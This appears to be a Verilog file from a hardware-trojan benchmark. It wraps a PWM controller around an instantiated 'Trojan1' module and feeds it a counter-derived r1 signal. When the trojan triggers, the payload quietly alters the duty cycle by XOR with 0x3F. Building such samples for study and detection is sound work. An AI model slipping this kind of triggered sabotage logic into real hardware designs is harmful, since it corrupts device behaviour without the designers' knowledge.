// PWM Host Circuit for Trojan1
// Fixed I/O to match Trojan1: clk, rst, r1 -> trigger
module trojan1_pwm_host #(
    parameter PWM_WIDTH = 10,     // PWM counter resolution
    parameter [11:0] R1_INIT = 12'h777  // Initial value for r1 generation
)(
    input wire clk,
    input wire rst,
    input wire [PWM_WIDTH-1:0] duty_cycle,
    input wire [PWM_WIDTH-1:0] period_value,
    input wire pwm_enable,
    output reg pwm_out,
    output reg period_complete
);

    // Trojan interface (fixed width)
    reg trojan_r1;
    wire trojan_trigger;
    
    // PWM control signals
    reg [PWM_WIDTH-1:0] pwm_counter;
    reg [11:0] r1_counter;
    reg [1:0] r1_mode;
    
    // R1 signal generation using counter with mode switching
    always @(posedge clk or posedge rst) begin
        if (rst) begin
            r1_counter <= R1_INIT;
            r1_mode <= 2'b00;
        end else if (pwm_enable) begin
            r1_counter <= r1_counter + 1;
            if (r1_counter[3:0] == 4'hF)
                r1_mode <= r1_mode + 1;
        end
    end
    
    // Select r1 based on mode
    always @(*) begin
        case (r1_mode)
            2'b00: trojan_r1 = r1_counter[0];
            2'b01: trojan_r1 = r1_counter[4];
            2'b10: trojan_r1 = r1_counter[8];
            2'b11: trojan_r1 = r1_counter[11];
            default: trojan_r1 = 1'b0;
        endcase
    end
    
    // PWM counter
    always @(posedge clk or posedge rst) begin
        if (rst) begin
            pwm_counter <= {PWM_WIDTH{1'b0}};
            period_complete <= 1'b0;
        end else if (pwm_enable) begin
            if (pwm_counter >= period_value) begin
                pwm_counter <= {PWM_WIDTH{1'b0}};
                period_complete <= 1'b1;
            end else begin
                pwm_counter <= pwm_counter + 1;
                period_complete <= 1'b0;
            end
        end else begin
            period_complete <= 1'b0;
        end
    end
    
    // PWM output generation with trojan trigger integration
    always @(posedge clk or posedge rst) begin
        if (rst) begin
            pwm_out <= 1'b0;
        end else if (pwm_enable) begin
            // PWM output with trojan trigger influence
            if (trojan_trigger) begin
                // Trojan modifies duty cycle slightly
                pwm_out <= (pwm_counter < (duty_cycle ^ PWM_WIDTH'(10'h3F)));
            end else begin
                pwm_out <= (pwm_counter < duty_cycle);
            end
        end else begin
            pwm_out <= 1'b0;
        end
    end
    
    // Instantiate Trojan1
    Trojan1 trojan_inst (
        .clk(clk),
        .rst(rst),
        .r1(trojan_r1),
        .trigger(trojan_trigger)
    );

endmodule

